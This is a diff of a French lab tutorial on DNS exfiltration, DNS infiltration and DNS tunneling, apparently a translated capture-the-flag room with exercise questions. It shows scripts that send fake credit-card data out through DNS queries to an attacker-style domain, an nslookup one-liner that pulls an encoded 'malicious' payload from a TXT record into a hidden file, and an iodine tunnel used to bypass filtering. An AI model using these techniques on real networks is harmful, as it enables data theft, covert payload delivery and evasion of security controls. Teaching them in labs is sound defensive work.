@@ -146,6 +146,8 @@ Cette technique est principalement utilisée comme moyen de collecter des inform
 - Dans cet exemple de scénario, un attaquant essaie d'exfiltrer des données vers son système et a décidé que sa meilleure option serait d'utiliser des requêtes DNS. 
 - L'objectif de l'attaquant est d'exfiltrer des informations sensibles d'une machine sur le réseau de SecureCorp. Dans cette démo, je montrerai les étapes qu'un attaquant pourrait suivre pour exfiltrer ces données de la machine compromise.
 
+<img src="https://cdn.discordapp.com/attachments/798799811482353734/807298488881643550/exfil.png"/>
+
 les informations de carte de crédit ont été générés via un faux générateur de cartes de crédit. 
 Toutes les informations de carte de crédit sont fausses :)
 
@@ -158,6 +160,7 @@ Vous aurez besoin de fichiers pour compléter le reste du TP.
 
 1. Fichier texte contenant de faux numéros de carte de crédit, noms, adresses.
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129675221958696/1.PNG"/>
 
 
 2. packety.py ( https://github.com/kleosdc/dns-exfil-infil )
@@ -168,6 +171,7 @@ Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivan
 
 * Nom de domaine : ( c'est ici que vous allez mettre votre nom de domaine, par exemple badbaddoma.in )
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129727180472340/2.1.PNG"/>
 
 
 `python packety.py
@@ -195,7 +199,13 @@ Lorsque packety.py est exécuté, vous devrez fournir au script l'entrée suivan
 - Une fois que tout est encodé et prêt, le code attendra que l'utilisateur appuie sur "ENTREE" afin de commencer à transmettre les requêtes au serveur DNS.  
 - Le serveur DNS aurait déjà été configuré pour capturer les requêtes entrantes avec 'Wireshark' ou 'tshark'.
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129732692967474/3.PNG"/>
+
 - Ensuite, il ne reste plus qu'à attendre que la transmission atteigne 100%. Si l'une des requêtes n'est pas livrée à temps et dans le bon ordre, les données exfiltrées seront incomplètes et inutiles pour l'attaquant.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129738539565066/5.PNG"/>
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129741236502568/6.PNG"/>
 
 3. `packetyGrabber.py` ( https://github.com/kleosdc/dns-exfil-infil )
 
@@ -206,6 +216,8 @@ Le code demandera à l'utilisateur la saisie suivante :
 * Sortie du nom de fichier : il s'agit du nom du fichier dans lequel les données décodées seront enregistrées.
 
 * Nom de domaine : Ce sera votre nom de domaine.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129744641622016/7.PNG"/>
 
 `python3 ~/tools/packety/packetyGrabber.py
 `
@@ -226,6 +238,8 @@ Le code demandera à l'utilisateur la saisie suivante :
 `[+] Output to credit-cards.txt
 `
 - Si tout se passe bien, qu'aucune requête n'a été perdue et que toutes les entrées sont correctes, un fichier avec les données décodées sera enregistré dans le même répertoire à partir duquel vous avez exécuté le code.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807129748282933258/8.PNG"/>
 
 ### Exfiltration DNS : Pratique
 
@@ -303,27 +317,99 @@ Réponse :
 
 ### Infiltration DNS : Theorie
 
-L'infiltration DNS est une autre technique d'attaque qui exploite les vulnérabilités des DNS.  
-Cette technique passe par un code malveillant qui est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés qui permettent aux attaquants de se connecter à distance à l'infrastructure réseau, soit à l'aide de programme frauduleux.  
+- L'infiltration DNS est une autre méthode utilisée par les attaquants pour exploiter les diverses vulnérabilités du système de noms de domaine d'une organisation. 
+
+- Contrairement aux attaques d'exfiltration sur le DNS, l'infiltration définit le processus par lequel le code malveillant est exécuté pour manipuler les serveurs DNS soit à l'aide de systèmes automatisés où les attaquants se connectent à distance à l'infrastructure réseau, soit manuellement.
+
+- L'infiltration DNS est principalement utilisée pour les efforts de suppression de fichiers ou de mise en scène de logiciels malveillants. 
+
+- Avec des systèmes de détection des menaces basés sur le comportement, les signatures ou la réputation, il est possible que cette méthode d'attaque soit détectée.
+
+- Cependant, si cette méthode de transport des données passe inaperçue, elle peut conduire à des activités malveillantes telles que l'exécution de code dans l'environnement de l'organisation. 
+
+- Historiquement, cela a causé des ravages et des perturbations pour diverses entreprises bien connues.
+
+- En résumé, le protocole DNS pourrait être utilisé comme un protocole secret qui pourrait faciliter les efforts de mise en scène et d'exécution des logiciels malveillants pour communiquer avec le ou les serveurs C2 (commande et contrôle) d'un attaquant. 
+
+- Dans la tâche suivante, nous explorerons comment cela pourrait être réalisé.
 
 ### Infiltration DNS : Exemple
 
-Le but étant souvent de supprimer des fichiers ou d'exécuter du code sur les machines ciblées.
+introduction
 
-<p align="center">
-  <img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
-</p>
+- Dans ce scénario, l'attaquant va infiltrer un morceau de code « malveillant » sur l'ordinateur de la victime. 
+- Il existe de nombreuses techniques différentes que les attaquants dans le monde réel utilisent pour y parvenir. 
+- Pour simplifier les choses, j'utiliserai un enregistrement TXT configuré sur mon serveur DNS AWS public. La valeur contenue dans cet enregistrement est un code 'malveillant' codé.
 
-### Infiltration DNS : Exemple
+- Étant donné que les enregistrements TXT sont limités à 255 caractères, les pirates informatiques auront probablement plusieurs enregistrements TXT configurés pour leur serveur DNS. Cela dépend finalement de la longueur de leur code. 
+- Maintenant que tout est configuré et prêt ; tout ce que le pirate informatique doit faire est de demander ces enregistrements TXT, de capturer la ou les valeurs, de les décoder et, les voilà maintenant infiltré leur propre code dans un système compromis via les enregistrements DNS TXT.
+
+<img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
+
+Vous pouvez voir mon enregistrement TXT ci-dessous.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807138166867623956/1.PNG"/>
+
+
+Fichiers utilisés pour cette démo
+
+1. `nslookup`
+
+Cela recherchera d'abord l'enregistrement TXT pour rt1.badbaddoma.in, puis obtiendra la valeur entre guillemets, et enfin, il enregistrera la valeur dans un fichier nommé '.mal.py'.
+
+`nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
+`
+
+2. `packetSimple.py` ( https://github.com/kleosdc/dns-exfil-infil )
+
+Lorsque le code vous demande un 'Nom de fichier', entrez le nom de fichier '.mal.py'. C'est le fichier dans lequel nous avons enregistré la valeur encodée.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/807140371967508500/2.PNG"/>
+
+
+`python3 ~/packetySimple.py
+`
+`Filename: .mal.py
+`
+`[+] Reading from file...
+`
+`[+] Base58 decoded.
+`
+`[+] Base64 decoded.
+`
+`[+] Done, .mal.py is decoded.
+`
+### Infiltration DNS : Pratique
+
+- Lisez le fichier TASK qui se trouve dans le dossier `~/challenges/infiltration/`.
+
+- Vous pouvez utiliser la même commande que celle utilisée dans la partie Infiltration DNS - Exemple.
+- Gardez à l'esprit que vous devrez ajuster la section « grep » et utiliser les caractères appropriés pour faire correspondre. Par exemple, si la valeur de texte de l'enregistrement TXT commence par « G6... », vous devrez utiliser « grep G6 ».
+
+**Répondre aux questions ci-dessous**
+
+Suivez les instructions du fichier TASK pour répondre à cette question.
+
+Quelle est la sortie du fichier python exécuté
+```
+reponse
+```
 
 ---
 
-### Tunneling 
+### Tunneling : Theorie
 
-Dans les deux tâches précédentes, nous avons vu comment les requêtes et les réponses DNS pouvaient être utilisées pour infiltrer et exécuter des charges utiles. Les entreprises auront généralement mis en place des pare-feu, des IDS (Intrusion Detection Systems) et/ou des IPS (Intrusion Protection Systems) afin de prévenir/alerter lorsque des protocoles entrants et sortants indésirables transitent par leur réseau. Le protocole DNS est rarement surveillé par les entreprises. Pour cette raison, les pirates peuvent contourner un grand nombre de protocoles « indésirables » en utilisant le tunneling DNS.
+- Dans les deux tâches précédentes, nous avons vu comment les requêtes et les réponses DNS pouvaient être utilisées pour infiltrer et exécuter des charges utiles. 
 
-Démo
-Pour cette démo, nous allons explorer comment un pirate peut contourner divers sites Web restreints en utilisant HTTP sur DNS. Pour y parvenir, j'utiliserai « iodine ». Vous pouvez en savoir plus sur 'Iodine' ici : [Iodin](https://code.kryo.se/iodine/).
+- Les entreprises auront généralement mis en place des pare-feu, des IDS (Intrusion Detection Systems) et/ou des IPS (Intrusion Protection Systems) afin de prévenir/alerter lorsque des protocoles entrants et sortants indésirables transitent par leur réseau. 
+
+- Le protocole DNS est rarement surveillé par les entreprises. Pour cette raison, les pirates peuvent contourner un grand nombre de protocoles « indésirables » en utilisant le tunneling DNS.
+
+### Tunneling : Exemple
+
+Pour cet Exemple, nous allons explorer comment un pirate peut contourner divers sites Web restreints en utilisant HTTP sur DNS. Pour y parvenir, j'utiliserai « iodine ». Vous pouvez en savoir plus sur 'Iodine' ici : [Iodin](https://code.kryo.se/iodine/).
+
+<img src="https://cdn.discordapp.com/attachments/798799811482353734/808200889432145950/tunnel.png"/>
 
 La configuration est la suivante :
 
@@ -331,6 +417,8 @@ Une machine Linux hébergée par AWS qui sera le serveur de tunnel DNS.
 Ubuntu VM s'exécutant sur un ordinateur local qui sera le client du tunnel DNS.
 Nom de domaine public hébergé sur Google Domains (badbadtunnel.in)
 Voici à quoi ressemble la configuration DNS :
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808025216428539954/0.PNG"/>
 
 - Pour commencer, les deux machines doivent avoir iodine installé.  
 - Si vous utilisez une distribution basée sur Debian telle que Kali, ce sera dans leurs référentiels apt.
@@ -344,6 +432,7 @@ Voici à quoi ressemble la configuration DNS :
 
 Sur le serveur AWS, nous commençons le iodined avec les arguments suivants :
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808024404113358868/4.PNG"/>
 
 `Port - 27001
 `
@@ -354,23 +443,36 @@ Sur le serveur AWS, nous commençons le iodined avec les arguments suivants :
 
 Maintenant, sur notre machine cliente, exécutez iode avec les arguments suivants :
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808026984356773928/5.PNG"/>
+
 `IP du serveur de tunnel DNS
 `
 `Nom de sous-domaine`
 
 - Si tout est configuré correctement, nous devrions maintenant avoir une connexion avec notre serveur de tunnel DNS. Nous pouvons essayer de pinger 10.0.0.1 (DNS Tunnel Server) pour voir si nous sommes connectés.
 
-Success!
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808027486234738728/9.PNG"/>
+
+Nous avons réussi !
 
 - Maintenant, nous avons fait à peu près la moitié du chemin. Notre HTTP sur DNS n'est pas encore complètement configuré.
 
-- Tout d'abord, nous devons générer une clé SSH et télécharger le contenu de id_rsa.pub sur notre serveur DNS Tunnel dans le fichier allowed_keys. Voici les étapes.
+- Tout d'abord, nous devons générer une clé SSH et télécharger le contenu de id_rsa.pub sur notre serveur DNS Tunnel dans le fichier allowed_keys. 
+- Voici les étapes :
 
-C'est le contenu de id_rsa.pub
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028494582775818/1.PNG"/>
+
+Voici le contenu de id_rsa.pub
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028636041052200/2.PNG"/>
 
 - Ici, vous pouvez voir qu'on a ajouté le contenu id_rsa.pub aux clés_autorisées sur mon serveur DNS. Cela me permettra de SSH dans mon serveur.
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808028824989728788/3.PNG"/>
+
 - Nous pouvons maintenant nous connecter en SSH à notre serveur de tunnel DNS avec l'option -D 8080
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808029032129888276/6.PNG"/>
 
 - On y est presqee, il nous suffit maintenant d'ouvrir notre navigateur (Firefox dans ce cas) et de modifier les paramètres du proxy. 
 - Il existe également des extensions de navigateur telles que FoxyProxy ou Proxy SwitchyOmega.
@@ -379,7 +481,11 @@ C'est le contenu de id_rsa.pub
 
 - Définissez l'hôte SOCKS avec l'adresse IP '127.0.0.1' et pour le numéro de port sur '8080'.
 
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808030366111629322/7.PNG"/>
 
-Terminé!
+Et voilà, c'est Terminé!
 
-Nous utilisons maintenant HTTP sur DNS... Si nous allons sur myip.is, nous devrions voir l'adresse IP publique de notre serveur de tunnel DNS.
+Nous utilisons maintenant HTTP sur DNS... 
+Si nous allons sur myip.is, nous devrions voir l'adresse IP publique de notre serveur de tunnel DNS.
+
+<img src="https://cdn.discordapp.com/attachments/807129623846584321/808030929665785866/8.PNG"/>
